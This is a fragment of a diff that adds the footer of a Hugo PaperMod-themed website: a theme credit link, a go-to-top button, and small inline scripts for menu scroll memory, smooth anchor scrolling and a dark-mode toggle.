+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
